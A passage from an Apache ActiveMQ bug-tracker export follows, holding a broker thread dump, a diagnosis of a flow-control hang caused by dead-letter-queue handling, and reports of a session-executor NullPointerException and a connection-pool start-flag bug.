        - parking to wait for  <0x00007f71efb09a10> (a java.util.concurrent.locks.AbstractQueuedSynchronizer$ConditionObject)
        at java.util.concurrent.locks.LockSupport.park(Unknown Source)
        at java.util.concurrent.locks.AbstractQueuedSynchronizer$ConditionObject.await(Unknown Source)
        at java.util.concurrent.DelayQueue.take(Unknown Source)
        at org.apache.activemq.broker.region.Queue$FlowControlTimeoutTask.run(Queue.java:169)

""Queue:queue/Einarbeitungsdaten_RemoteQ"" daemon prio=10 tid=0x00007f71b04c7000 nid=0x4108 in Object.wait() [0x00007f71b5853000]
   java.lang.Thread.State: WAITING (on object monitor)
        at java.lang.Object.wait(Native Method)
        - waiting on <0x00007f71efb08f40> (a java.lang.Object)
        at java.lang.Object.wait(Object.java:485)
        at org.apache.activemq.thread.DedicatedTaskRunner.runTask(DedicatedTaskRunner.java:105)
        - locked <0x00007f71efb08f40> (a java.lang.Object)
        at org.apache.activemq.thread.DedicatedTaskRunner$1.run(DedicatedTaskRunner.java:36)

""Checkpoint: queue://queue/Einarbeitungsdaten_RemoteQ"" daemon prio=10 tid=0x00007f71b04c6000 nid=0x4107 in Object.wait() [0x00007f71b5954000]
   java.lang.Thread.State: WAITING (on object monitor)
        at java.lang.Object.wait(Native Method)
        - waiting on <0x00007f71efb08330> (a java.lang.Object)
        at java.lang.Object.wait(Object.java:485)
        at org.apache.activemq.thread.DedicatedTaskRunner.runTask(DedicatedTaskRunner.java:105)
        - locked <0x00007f71efb08330> (a java.lang.Object)
        at org.apache.activemq.thread.DedicatedTaskRunner$1.run(DedicatedTaskRunner.java:36)

""Topic  ActiveMQ.Advisory.Queue"" daemon prio=10 tid=0x00007f71b0613800 nid=0x4106 in Object.wait() [0x00007f71b5a55000]
   java.lang.Thread.State: WAITING (on object monitor)
        at java.lang.Object.wait(Native Method)
        - waiting on <0x00007f71efb487a8> (a java.lang.Object)
        at java.lang.Object.wait(Object.java:485)
        at org.apache.activemq.thread.DedicatedTaskRunner.runTask(DedicatedTaskRunner.java:105)
        - locked <0x00007f71efb487a8> (a java.lang.Object)
        at org.apache.activemq.thread.DedicatedTaskRunner$1.run(DedicatedTaskRunner.java:36)

""Producer Flow Control Timeout Task"" prio=10 tid=0x00007f71b04c9800 nid=0x4105 waiting on condition [0x00007f71b5b56000]
   java.lang.Thread.State: WAITING (parking)
        at sun.misc.Unsafe.park(Native Method)
        - parking to wait for  <0x00007f71c3cbded0> (a java.util.concurrent.locks.AbstractQueuedSynchronizer$ConditionObject)
        at java.util.concurrent.locks.LockSupport.park(Unknown Source)
        at java.util.concurrent.locks.AbstractQueuedSynchronizer$ConditionObject.await(Unknown Source)
        at java.util.concurrent.DelayQueue.take(Unknown Source)
        at org.apache.activemq.broker.region.Queue$FlowControlTimeoutTask.run(Queue.java:169)

""Queue:queue/Initialdaten_RemoteQ"" daemon prio=10 tid=0x00007f71b061e800 nid=0x4104 in Object.wait() [0x00007f71b5c57000]
   java.lang.Thread.State: WAITING (on object monitor)
        at java.lang.Object.wait(Native Method)
        - waiting on <0x00007f71efac23b8> (a java.lang.Object)
        at java.lang.Object.wait(Object.java:485)
        at org.apache.activemq.thread.DedicatedTaskRunner.runTask(DedicatedTaskRunner.java:105)
        - locked <0x00007f71efac23b8> (a java.lang.Object)
        at org.apache.activemq.thread.DedicatedTaskRunner$1.run(DedicatedTaskRunner.java:36)

""Checkpoint: queue://queue/Initialdaten_RemoteQ"" daemon prio=10 tid=0x00007f71b04b3800 nid=0x4103 in Object.wait() [0x00007f71b5d58000]
   java.lang.Thread.State: WAITING (on object monitor)
        at java.lang.Object.wait(Native Method)
        - waiting on <0x00007f71efac1990> (a java.lang.Object)
        at java.lang.Object.wait(Object.java:485)
        at org.apache.activemq.thread.DedicatedTaskRunner.runTask(DedicatedTaskRunner.java:105)
        - locked <0x00007f71efac1990> (a java.lang.Object)
        at org.apache.activemq.thread.DedicatedTaskRunner$1.run(DedicatedTaskRunner.java:36)

""ActiveMQ Journal Checkpoint Worker"" daemon prio=10 tid=0x00007f71b05d0800 nid=0x4102 in Object.wait() [0x00007f71b6b72000]
   java.lang.Thread.State: WAITING (on object monitor)
        at java.lang.Object.wait(Native Method)
        - waiting on <0x00007f71ef960c48> (a java.lang.Object)
        at java.lang.Object.wait(Object.java:485)
        at org.apache.activemq.thread.DedicatedTaskRunner.runTask(DedicatedTaskRunner.java:105)
        - locked <0x00007f71ef960c48> (a java.lang.Object)
        at org.apache.activemq.thread.DedicatedTaskRunner$1.run(DedicatedTaskRunner.java:36)

""RMI RenewClean-[10.130.18.244:35003]"" daemon prio=10 tid=0x00007f71b04d8000 nid=0x4100 in Object.wait() [0x00007f71b5f5a000]
   java.lang.Thread.State: TIMED_WAITING (on object monitor)
        at java.lang.Object.wait(Native Method)
        - waiting on <0x00007f71efc91e50> (a java.lang.ref.ReferenceQueue$Lock)
        at java.lang.ref.ReferenceQueue.remove(Unknown Source)
        - locked <0x00007f71efc91e50> (a java.lang.ref.ReferenceQueue$Lock)
        at sun.rmi.transport.DGCClient$EndpointEntry$RenewCleanThread.run(Unknown Source)
        at java.lang.Thread.run(Unknown Source)

""ActiveMQ Data File Writer"" daemon prio=10 tid=0x00007f71b83b6000 nid=0x40ff in Object.wait() [0x00007f71b655e000]
   java.lang.Thread.State: WAITING (on object monitor)
        at java.lang.Object.wait(Native Method)
        - waiting on <0x00007f71c7fd9fa0> (a org.apache.activemq.kaha.impl.async.DataFileAppender$1)
        at java.lang.Object.wait(Object.java:485)
        at org.apache.activemq.kaha.impl.async.NIODataFileAppender.processQueue(NIODataFileAppender.java:80)
        - locked <0x00007f71c7fd9fa0> (a org.apache.activemq.kaha.impl.async.DataFileAppender$1)
        at org.apache.activemq.kaha.impl.async.DataFileAppender$2.run(DataFileAppender.java:230)

""RMI Scheduler(0)"" daemon prio=10 tid=0x00007f71b83b7000 nid=0x40fe waiting on condition [0x00007f71b665f000]
   java.lang.Thread.State: TIMED_WAITING (parking)
        at sun.misc.Unsafe.park(Native Method)
        - parking to wait for  <0x00007f71c28fd860> (a java.util.concurrent.locks.AbstractQueuedSynchronizer$ConditionObject)
        at java.util.concurrent.locks.LockSupport.parkNanos(Unknown Source)
        at java.util.concurrent.locks.AbstractQueuedSynchronizer$ConditionObject.awaitNanos(Unknown Source)
        at java.util.concurrent.DelayQueue.take(Unknown Source)
        at java.util.concurrent.ScheduledThreadPoolExecutor$DelayedWorkQueue.take(Unknown Source)
        at java.util.concurrent.ScheduledThreadPoolExecutor$DelayedWorkQueue.take(Unknown Source)
        at java.util.concurrent.ThreadPoolExecutor.getTask(Unknown Source)
        at java.util.concurrent.ThreadPoolExecutor$Worker.run(Unknown Source)
        at java.lang.Thread.run(Unknown Source)

""GC Daemon"" daemon prio=10 tid=0x0000000040564800 nid=0x40fc in Object.wait() [0x00007f71b6970000]
   java.lang.Thread.State: TIMED_WAITING (on object monitor)
        at java.lang.Object.wait(Native Method)
        - waiting on <0x00007f71c2926ee0> (a sun.misc.GC$LatencyLock)
        at sun.misc.GC$Daemon.run(Unknown Source)
        - locked <0x00007f71c2926ee0> (a sun.misc.GC$LatencyLock)

""RMI Reaper"" prio=10 tid=0x000000004023a000 nid=0x40fb in Object.wait() [0x00007f71b6a71000]
   java.lang.Thread.State: WAITING (on object monitor)
        at java.lang.Object.wait(Native Method)
        - waiting on <0x00007f71c28fbee0> (a java.lang.ref.ReferenceQueue$Lock)
        at java.lang.ref.ReferenceQueue.remove(Unknown Source)
        - locked <0x00007f71c28fbee0> (a java.lang.ref.ReferenceQueue$Lock)
        at java.lang.ref.ReferenceQueue.remove(Unknown Source)
        at sun.rmi.transport.ObjectTable$Reaper.run(Unknown Source)
        at java.lang.Thread.run(Unknown Source)

""RMI TCP Accept-51109"" daemon prio=10 tid=0x00007f71b8333800 nid=0x40f9 runnable [0x00007f71b6c73000]
   java.lang.Thread.State: RUNNABLE
        at java.net.PlainSocketImpl.socketAccept(Native Method)
        at java.net.PlainSocketImpl.accept(Unknown Source)
        - locked <0x00007f71c28817a8> (a java.net.SocksSocketImpl)
        at java.net.ServerSocket.implAccept(Unknown Source)
        at java.net.ServerSocket.accept(Unknown Source)
        at sun.rmi.transport.tcp.TCPTransport$AcceptLoop.executeAcceptLoop(Unknown Source)
        at sun.rmi.transport.tcp.TCPTransport$AcceptLoop.run(Unknown Source)
        at java.lang.Thread.run(Unknown Source)

""ActiveMQ Scheduler"" daemon prio=10 tid=0x00007f71b836e800 nid=0x40f8 in Object.wait() [0x00007f71b6d74000]
   java.lang.Thread.State: TIMED_WAITING (on object monitor)
        at java.lang.Object.wait(Native Method)
        - waiting on <0x00007f71c28ba498> (a java.util.TaskQueue)
        at java.util.TimerThread.mainLoop(Unknown Source)
        - locked <0x00007f71c28ba498> (a java.util.TaskQueue)
        at java.util.TimerThread.run(Unknown Source)

""RMI TCP Accept-0"" daemon prio=10 tid=0x00007f71b0092000 nid=0x40f6 runnable [0x00007f71b70c6000]
   java.lang.Thread.State: RUNNABLE
        at java.net.PlainSocketImpl.socketAccept(Native Method)
        at java.net.PlainSocketImpl.accept(Unknown Source)
        - locked <0x00007f71c2881d38> (a java.net.SocksSocketImpl)
        at java.net.ServerSocket.implAccept(Unknown Source)
        at java.net.ServerSocket.accept(Unknown Source)
        at sun.management.jmxremote.LocalRMIServerSocketFactory$1.accept(Unknown Source)
        at sun.rmi.transport.tcp.TCPTransport$AcceptLoop.executeAcceptLoop(Unknown Source)
        at sun.rmi.transport.tcp.TCPTransport$AcceptLoop.run(Unknown Source)
        at java.lang.Thread.run(Unknown Source)

""RMI TCP Accept-11099"" daemon prio=10 tid=0x00007f71b0090000 nid=0x40f5 runnable [0x00007f71b71c7000]
   java.lang.Thread.State: RUNNABLE
        at java.net.PlainSocketImpl.socketAccept(Native Method)
        at java.net.PlainSocketImpl.accept(Unknown Source)
        - locked <0x00007f71c28821c0> (a java.net.SocksSocketImpl)
        at java.net.ServerSocket.implAccept(Unknown Source)
        at java.net.ServerSocket.accept(Unknown Source)
        at sun.rmi.transport.tcp.TCPTransport$AcceptLoop.executeAcceptLoop(Unknown Source)
        at sun.rmi.transport.tcp.TCPTransport$AcceptLoop.run(Unknown Source)
        at java.lang.Thread.run(Unknown Source)

""RMI TCP Accept-0"" daemon prio=10 tid=0x00007f71b0082000 nid=0x40f4 runnable [0x00007f71b72c8000]
   java.lang.Thread.State: RUNNABLE
        at java.net.PlainSocketImpl.socketAccept(Native Method)
        at java.net.PlainSocketImpl.accept(Unknown Source)
        - locked <0x00007f71c2882630> (a java.net.SocksSocketImpl)
        at java.net.ServerSocket.implAccept(Unknown Source)
        at java.net.ServerSocket.accept(Unknown Source)
        at sun.rmi.transport.tcp.TCPTransport$AcceptLoop.executeAcceptLoop(Unknown Source)
        at sun.rmi.transport.tcp.TCPTransport$AcceptLoop.run(Unknown Source)
        at java.lang.Thread.run(Unknown Source)

""CommunicatorServer"" daemon prio=10 tid=0x00007f71b003c000 nid=0x40f3 runnable [0x00007f71b73c9000]
   java.lang.Thread.State: RUNNABLE
        at java.net.PlainDatagramSocketImpl.receive0(Native Method)
        - locked <0x00007f71c289e760> (a java.net.PlainDatagramSocketImpl)
        at java.net.PlainDatagramSocketImpl.receive(Unknown Source)
        - locked <0x00007f71c289e760> (a java.net.PlainDatagramSocketImpl)
        at java.net.DatagramSocket.receive(Unknown Source)
        - locked <0x00007f71c289e7d0> (a java.net.DatagramPacket)
        - locked <0x00007f71c289e718> (a java.net.DatagramSocket)
        at com.sun.jmx.snmp.daemon.SnmpAdaptorServer.doReceive(Unknown Source)
        at com.sun.jmx.snmp.daemon.CommunicatorServer.run(Unknown Source)
        at java.lang.Thread.run(Unknown Source)

""Low Memory Detector"" daemon prio=10 tid=0x00007f71b0002000 nid=0x40ef runnable [0x0000000000000000]
   java.lang.Thread.State: RUNNABLE

""CompilerThread1"" daemon prio=10 tid=0x00007f71b826c000 nid=0x40ee waiting on condition [0x0000000000000000]
   java.lang.Thread.State: RUNNABLE

""CompilerThread0"" daemon prio=10 tid=0x00007f71b826a000 nid=0x40ed waiting on condition [0x0000000000000000]
   java.lang.Thread.State: RUNNABLE

""JDWP Event Helper Thread"" daemon prio=10 tid=0x00007f71b8267800 nid=0x40ec runnable [0x0000000000000000]
   java.lang.Thread.State: RUNNABLE

""JDWP Transport Listener: dt_socket"" daemon prio=10 tid=0x00007f71b8264000 nid=0x40eb runnable [0x0000000000000000]
   java.lang.Thread.State: RUNNABLE

""Signal Dispatcher"" daemon prio=10 tid=0x00007f71b8258000 nid=0x40ea waiting on condition [0x0000000000000000]
   java.lang.Thread.State: RUNNABLE

""Finalizer"" daemon prio=10 tid=0x00007f71b823a000 nid=0x40e9 in Object.wait() [0x00007f71b7ffe000]
   java.lang.Thread.State: WAITING (on object monitor)
        at java.lang.Object.wait(Native Method)
        - waiting on <0x00007f71c2927370> (a java.lang.ref.ReferenceQueue$Lock)
        at java.lang.ref.ReferenceQueue.remove(Unknown Source)
        - locked <0x00007f71c2927370> (a java.lang.ref.ReferenceQueue$Lock)
        at java.lang.ref.ReferenceQueue.remove(Unknown Source)
        at java.lang.ref.Finalizer$FinalizerThread.run(Unknown Source)

""Reference Handler"" daemon prio=10 tid=0x00007f71b8238000 nid=0x40e8 in Object.wait() [0x00007f71bc1af000]
   java.lang.Thread.State: WAITING (on object monitor)
        at java.lang.Object.wait(Native Method)
        - waiting on <0x00007f71c2926ed0> (a java.lang.ref.Reference$Lock)
        at java.lang.Object.wait(Object.java:485)
        at java.lang.ref.Reference$ReferenceHandler.run(Unknown Source)
        - locked <0x00007f71c2926ed0> (a java.lang.ref.Reference$Lock)

""main"" prio=10 tid=0x000000004011d800 nid=0x40d8 in Object.wait() [0x00007f71f6488000]
   java.lang.Thread.State: WAITING (on object monitor)
        at java.lang.Object.wait(Native Method)
        - waiting on <0x00007f71efd33780> (a [Z)
        at java.lang.Object.wait(Object.java:485)
        at org.apache.activemq.console.command.StartCommand.waitForShutdown(StartCommand.java:161)
        - locked <0x00007f71efd33780> (a [Z)
        at org.apache.activemq.console.command.StartCommand.runTask(StartCommand.java:104)
        at org.apache.activemq.console.command.AbstractCommand.execute(AbstractCommand.java:57)
        at org.apache.activemq.console.command.ShellCommand.runTask(ShellCommand.java:136)
        at org.apache.activemq.console.command.AbstractCommand.execute(AbstractCommand.java:57)
        at org.apache.activemq.console.command.ShellCommand.main(ShellCommand.java:82)
        at sun.reflect.NativeMethodAccessorImpl.invoke0(Native Method)
        at sun.reflect.NativeMethodAccessorImpl.invoke(Unknown Source)
        at sun.reflect.DelegatingMethodAccessorImpl.invoke(Unknown Source)
        at java.lang.reflect.Method.invoke(Unknown Source)
        at org.apache.activemq.console.Main.runTaskClass(Main.java:251)
        at org.apache.activemq.console.Main.main(Main.java:107)

""VM Thread"" prio=10 tid=0x00007f71b8233800 nid=0x40e7 runnable 

""GC task thread#0 (ParallelGC)"" prio=10 tid=0x0000000040127800 nid=0x40da runnable 

""GC task thread#1 (ParallelGC)"" prio=10 tid=0x0000000040129800 nid=0x40db runnable 

""GC task thread#2 (ParallelGC)"" prio=10 tid=0x000000004012b800 nid=0x40dc runnable 

""GC task thread#3 (ParallelGC)"" prio=10 tid=0x000000004012d000 nid=0x40dd runnable 

""GC task thread#4 (ParallelGC)"" prio=10 tid=0x000000004012f000 nid=0x40de runnable 

""GC task thread#5 (ParallelGC)"" prio=10 tid=0x0000000040131000 nid=0x40df runnable 

""GC task thread#6 (ParallelGC)"" prio=10 tid=0x0000000040132800 nid=0x40e0 runnable 

""GC task thread#7 (ParallelGC)"" prio=10 tid=0x0000000040134800 nid=0x40e1 runnable 

""GC task thread#8 (ParallelGC)"" prio=10 tid=0x0000000040136800 nid=0x40e2 runnable 

""GC task thread#9 (ParallelGC)"" prio=10 tid=0x0000000040138000 nid=0x40e3 runnable 

""GC task thread#10 (ParallelGC)"" prio=10 tid=0x000000004013a000 nid=0x40e4 runnable 

""GC task thread#11 (ParallelGC)"" prio=10 tid=0x000000004013c000 nid=0x40e5 runnable 

""GC task thread#12 (ParallelGC)"" prio=10 tid=0x000000004013d800 nid=0x40e6 runnable 

""VM Periodic Task Thread"" prio=10 tid=0x00007f71b0094800 nid=0x40f7 waiting on condition 

JNI global references: 6239

Heap
 PSYoungGen      total 199552K, used 51797K [0x00007f71e2800000, 0x00007f71f1f10000, 0x00007f71f2800000)
  eden space 158528K, 23% used [0x00007f71e2800000,0x00007f71e4bdcd18,0x00007f71ec2d0000)
  from space 41024K, 36% used [0x00007f71ef700000,0x00007f71f05b8820,0x00007f71f1f10000)
  to   space 47232K, 0% used [0x00007f71ec2d0000,0x00007f71ec2d0000,0x00007f71ef0f0000)
 PSOldGen        total 199616K, used 95454K [0x00007f71c2800000, 0x00007f71ceaf0000, 0x00007f71e2800000)
  object space 199616K, 47% used [0x00007f71c2800000,0x00007f71c8537b48,0x00007f71ceaf0000)
 PSPermGen       total 43264K, used 43152K [0x00007f71bd400000, 0x00007f71bfe40000, 0x00007f71c2800000)
  object space 43264K, 99% used [0x00007f71bd400000,0x00007f71bfe24138,0x00007f71bfe40000)

 INFO | Usage Manager Store is Full. Producer (ID:HOST2-46261-1270635495961-0:0:6:1) stopped to prevent flooding queue://queue/Einarbeitungsdaten_RemoteQ. See http://activemq.apache.org/producer-flow-control.html for more info (blocking for: 210s)
 INFO | Usage Manager Store is Full. Producer (ID:HOST2-12587-1270572565654-0:22380:1:1) stopped to prevent flooding queue://queue/Initialdaten_RemoteQ. See http://activemq.apache.org/producer-flow-control.html for more info (blocking for: 300s)
 INFO | Usage Manager Store is Full. Producer (ID:HOST2-46261-1270635495961-0:0:6:1) stopped to prevent floodi
{code} 
;;;","08/Apr/10 10:32;scoopex;Retested this issue with kahadb backend and created threaddumps (IBM jvm).

The name of the blocked queue was: queue/Einarbeitungsdaten_RemoteQ

The problem also appears by using the kahadb backend:

{code}
$ unzip -l producer-flow-control-problem.zip
Archive:  producer-flow-control-problem.zip
  Length      Date    Time    Name
---------  ---------- -----   ----
        0  2010-04-08 12:20   producer-flow-control-problem/    
   819119  2010-04-08 12:20   producer-flow-control-problem/activemq-javacore.20100408.115629.32099.0001.txt          (Threaddump of the ActiveMQ Standalone Broker)
   150326  2010-04-08 12:20   producer-flow-control-problem/standalone-client-javacore.20100408.115629.4914.0001.txt  (Threaddump of a standalone consumer : apache-activemq-5.3.1/example)
     6575  2010-04-08 12:20   producer-flow-control-problem/activemq.xml                                              (Configuration of the broker)
  2174495  2010-04-08 12:20   producer-flow-control-problem/jboss-javacore.20100408.115629.3419.0001.txt              (Threaddump of JBOSS Appserver which runs two message driven beans, consumers)  
---------                     -------
  3150515                     5 files
{code}
;;;","14/Apr/10 11:18;gtully;The problem with the hang is DLQ processing. The stack trace of the broker has:{code}3XMTHREADINFO      ""ActiveMQ Transport: tcp:///127.0.0.1:53609"" TID:0x00000000010B1200, j9thread_t:0x00000000025A8890, state:CW, prio=8
3XMTHREADINFO1            (native thread ID:0xFD2, native priority:0x8, native policy:UNKNOWN)
4XESTACKTRACE          at java/lang/Object.wait(Native Method)
4XESTACKTRACE          at java/lang/Object.wait(Object.java:196(Compiled Code))
4XESTACKTRACE          at org/apache/activemq/usage/Usage.waitForSpace(Usage.java:87(Compiled Code))
4XESTACKTRACE          at org/apache/activemq/broker/region/Queue.waitForSpace(Queue.java:1726)
4XESTACKTRACE          at org/apache/activemq/broker/region/Queue.doMessageSend(Queue.java:568)
4XESTACKTRACE          at org/apache/activemq/broker/region/Queue.send(Queue.java:539)
4XESTACKTRACE          at org/apache/activemq/broker/region/AbstractRegion.send(AbstractRegion.java:354)
4XESTACKTRACE          at org/apache/activemq/broker/region/RegionBroker.send(RegionBroker.java:445)
4XESTACKTRACE          at org/apache/activemq/broker/TransactionBroker.send(TransactionBroker.java:224)
4XESTACKTRACE          at org/apache/activemq/broker/BrokerFilter.send(BrokerFilter.java:126)
4XESTACKTRACE          at org/apache/activemq/broker/CompositeDestinationBroker.send(CompositeDestinationBroker.java:95)
4XESTACKTRACE          at org/apache/activemq/broker/MutableBrokerFilter.send(MutableBrokerFilter.java:133)
4XESTACKTRACE          at org/apache/activemq/util/BrokerSupport.doResend(BrokerSupport.java:65)
4XESTACKTRACE          at org/apache/activemq/util/BrokerSupport.resendNoCopy(BrokerSupport.java:36)
4XESTACKTRACE          at org/apache/activemq/broker/region/RegionBroker.sendToDeadLetterQueue(RegionBroker.java:727)
4XESTACKTRACE          at org/apache/activemq/broker/region/PrefetchSubscription.sendToDLQ(PrefetchSubscription.java:457(Compiled Code))
4XESTACKTRACE          at org/apache/activemq/broker/region/PrefetchSubscription.acknowledge(PrefetchSubscription.java:195(Compiled Code))
4XESTACKTRACE          at org/apache/activemq/broker/region/AbstractRegion.acknowledge(AbstractRegion.java:373(Compiled Code))
4XESTACKTRACE          at org/apache/activemq/broker/region/RegionBroker.acknowledge(RegionBroker.java:470(Compiled Code))
4XESTACKTRACE          at org/apache/activemq/broker/TransactionBroker.acknowledge(TransactionBroker.java:194(Compiled Code))
4XESTACKTRACE          at org/apache/activemq/broker/BrokerFilter.acknowledge(BrokerFilter.java:74(Compiled Code))
4XESTACKTRACE          at org/apache/activemq/broker/BrokerFilter.acknowledge(BrokerFilter.java:74(Compiled Code))
4XESTACKTRACE          at org/apache/activemq/broker/MutableBrokerFilter.acknowledge(MutableBrokerFilter.java:85(Compiled Code))
4XESTACKTRACE          at org/apache/activemq/broker/TransportConnection.processMessageAck(TransportConnection.java:451(Compiled Code))
4XESTACKTRACE          at org/apache/activemq/command/MessageAck.visit(MessageAck.java(Compiled Code))
4XESTACKTRACE          at org/apache/activemq/broker/TransportConnection.service(TransportConnection.java:300(Compiled Code))
4XESTACKTRACE          at org/apache/activemq/broker/TransportConnection$1.onCommand(TransportConnection.java:178(Compiled Code))
4XESTACKTRACE          at org/apache/activemq/transport/TransportFilter.onCommand(TransportFilter.java:68(Compiled Code))
4XESTACKTRACE          at org/apache/activemq/transport/WireFormatNegotiator.onCommand(WireFormatNegotiator.java:109(Compiled Code))
4XESTACKTRACE          at org/apache/activemq/transport/InactivityMonitor.onCommand(InactivityMonitor.java:216(Compiled Code))
{code}

A poison ack is coming from one of the consumers, the message has exceeded its redelivery quota so is is being discarded. However, the DLQ for a persistent message uses the same store that is currently full, so that ack is blocking on store usage which blocks the consumer.

There are a few options here:
* You could use a topic for the DLQ and the persistence will be optimised out if there are no durable subs to the DLQ topic for that Destination.
* You could disable DLQ processing for that destination
* You could investigate the redelivery issue on the consumer to avoid the use of the DQL by configuring a redelivery policy that does not limit the redeliveries. The message will remain on the consumer till it is accepted.
* a resolution to https://issues.apache.org/activemq/browse/AMQ-2668 would help, the test q could block a 70% leaving 30% for DLQ handling.
;;;","14/Apr/10 11:19;gtully;link to per destination store usage high water mark policy feature https://issues.apache.org/activemq/browse/AMQ-2668;;;","14/Apr/10 12:23;scoopex;Very interesting - i will try to verify this with my setup...

It would e very helpful for sysadmins to get a warning message which provides information that a queue is blocked for enqueue/dequeue 
because of the fact that there is no space for potentially submitting messages to the dead letter queue....

;;;","23/Apr/10 15:20;gtully;Think the fix for https://issues.apache.org/activemq/browse/AMQ-2668 sort this. Reopen if here is any update or change.;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
"""VMTransport"" NullPointerException from ActiveMQSessionExecutor.wakeup",AMQ-2679,12483570,,Bug,Resolved,AMQ,ActiveMQ,software,bsnyder,"<a href=""http://activemq.apache.org/"">Apache ActiveMQ</a> is the most popular and powerful open source Message Broker. Apache ActiveMQ is fast, supports many <a href=""http://activemq.apache.org/cross-language-clients.html"">Cross Language Clients and Protocols</a> and many <a href=""http://activemq.apache.org/features.html"">advanced features<a> while fully supporting JMS 1.1 and J2EE 1.4. Apache ActiveMQ is released under the Apache 2.0 License",http://activemq.apache.org/,Major,Fixed,,easyl,easyl,29/Mar/10 14:32,20/Sep/11 10:42,14/Jul/23 05:43,01/Jul/11 21:33,4.1.2,,,,,5.6.0,,,Broker,Geronimo Integration,,,0,,,,,,,,,"setup in Geronimo deployment plan with 
{quote}
<config-property-setting name=""ServerUrl"">vm://localhost?async=true&jms.asyncDispatch=false&jms.copyMessageOnSend=false&jms.watchTopicAdvisories=false</config-property-setting> 
{quote}

I use only JMS send/reply pattern:
{quote}
connection = factory.createQueueConnection(); 
connection.start(); 
session = connection.createQueueSession(false, Session.AUTO_ACKNOWLEDGE); 
sender = session.createSender(requestQueue); 
replyQueue = session.createTemporaryQueue(); 
jmsRequestMessage = session.createTextMessage(); 
sender.send(jmsRequestMessage, DeliveryMode.NON_PERSISTENT, Message.DEFAULT_PRIORITY, timeToLive); 
receiver = session.createReceiver(replyQueue); 
jmsReplyMessage = receiver.receive(); 
connection.close();
{quote}

When the message traffic get huge (or the server is under intensive computing), I would got such NPE 
{quote}
 Exception in thread ""VMTransport"" java.lang.NullPointerException 
 at  org.apache.activemq.ActiveMQSessionExecutor.wakeup(ActiveMQSessionExecutor.java:76) 
 at  org.apache.activemq.ActiveMQSessionExecutor.execute(ActiveMQSessionExecutor.java:61) 
 at org.apache.activemq.ActiveMQSession.dispatch(ActiveMQSession.java:1344) 
 at  org.apache.activemq.ActiveMQConnection.onCommand(ActiveMQConnection.java:1485) 
 at  org.apache.activemq.transport.ResponseCorrelator.onCommand(ResponseCorrelator.java:95) 
 at  org.apache.activemq.transport.TransportFilter.onCommand(TransportFilter.java:65) 
 at  org.apache.activemq.transport.vm.VMTransport.iterate(VMTransport.java:201) 
 at  org.apache.activemq.thread.PooledTaskRunner.runTask(PooledTaskRunner.java:120) 
 at  org.apache.activemq.thread.PooledTaskRunner.access$100(PooledTaskRunner.java:26) 
 at  org.apache.activemq.thread.PooledTaskRunner$1.run(PooledTaskRunner.java:47) 
 at  edu.emory.mathcs.backport.java.util.concurrent.ThreadPoolExecutor$Worker.runTask(ThreadPoolExecutor.java:665) 
 at  edu.emory.mathcs.backport.java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:690) 
 at java.lang.Thread.run(Thread.java:619) 
{quote}

setting _jms.asyncDispatch=false_ may ease the problem, but the NPE still happens..

as comment from kevan http://n3.nabble.com/sudden-NullPointerException-from-ActiveMQSessionExecutor-wakeup-tt676485.html#a676966
It could be a timing hole in ActiveMQSessionExecutor.
possible fix from kevan
{quote}
Index: activemq-core/src/main/java/org/apache/activemq/ActiveMQSessionExecutor.java 
=================================================================== 
--- activemq-core/src/main/java/org/apache/activemq/ActiveMQSessionExecutor.java	(revision 663068) 
+++ activemq-core/src/main/java/org/apache/activemq/ActiveMQSessionExecutor.java	(working copy) 
@@ -118,10 +118,14 @@ 
         try { 
             if (messageQueue.isRunning()) { 
                 messageQueue.stop(); 
-                if (taskRunner != null) { 
-                    taskRunner.shutdown(); 
-                    taskRunner = null; 
+                TaskRunner tempTaskRunner; 
+                synchronized (this) { 
+                    tempTaskRunner = this.taskRunner; 
+                    this.taskRunner = null; 
                 } 
+                if (tempTaskRunner != null) { 
+                    tempTaskRunner.shutdown(); 
+                } 
             } 
         } catch (InterruptedException e) { 
             Thread.currentThread().interrupt(); 
{quote}


","AMQ 4.1.2 embedded in Geronimo 2.1.3, SuSE Linux 11",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,0.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,43764,,,Fri Jul 01 21:33:19 UTC 2011,,,,,,,,,,,"0|i0akhj:",59592,,,,,,,,,,,,,,,,,,,,,"30/Mar/10 06:02;rajdavies;Does look like it could be a timing issue - can fix in trunk. We don't go back to previous major versions and do releases generally.;;;","01/Jul/11 21:33;tabish;This code has been fixed in trunk for awhile;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
"org.apache.activemq.pool.ConnectionPool should not set ""started"" flag if start() throws an exception",AMQ-2677,12483268,,Bug,Resolved,AMQ,ActiveMQ,software,bsnyder,"<a href=""http://activemq.apache.org/"">Apache ActiveMQ</a> is the most popular and powerful open source Message Broker. Apache ActiveMQ is fast, supports many <a href=""http://activemq.apache.org/cross-language-clients.html"">Cross Language Clients and Protocols</a> and many <a href=""http://activemq.apache.org/features.html"">advanced features<a> while fully supporting JMS 1.1 and J2EE 1.4. Apache ActiveMQ is released under the Apache 2.0 License",http://activemq.apache.org/,Major,Fixed,dejanb,ariekenb,ariekenb,27/Mar/10 15:57,31/Mar/10 11:52,14/Jul/23 05:43,31/Mar/10 11:52,5.3.1,,,,,5.4.0,,,Broker,,,,0,,,,,,,,,"If org.apache.activemq.pool.ConnectionPool.start throws a JMSException, the ""started"" flag in ConnectionPool should not be set to true.  If start() throws an exception, the underlying ActiveMQConnection object will not be started.  Since started=true, any subsequent calls to ConnectionPool.start will do nothing, and a non-started connection may be used by the pool.

I ran into this problem when using Camel to consume messages - see the attached test program for an example.  This test program does the following:

1. Starts a bean consuming from queue test.queue using Camel.  The URL used by Camel to connect to ActiveMQ is:

failover:(tcp://127.0.0.1:61616)?timeout=1000&initialReconnectDelay=1000&maxReconnectDelay=1000&useExponentialBackOff=false

The test program uses the default behavior of Camel's ActiveMQComponent which creates a PooledConnectionFactory.

2. Waits 10 seconds, then starts an ActiveMQ broker on port 61616.  During this wait time, Camel's connection to the broker fails every second and it is continually retrying.

3. Sends 10 messages to the queue ""test.queue"".

The call to ConnectionPool.start by camel throws an exception after blocking for 1 second since timeout=1000 is set in the URL.  However the ""started"" flag is set to true, so subsequent calls to ConnectionPool.start by Camel on connection retries do not restart the ActiveMQConnection.

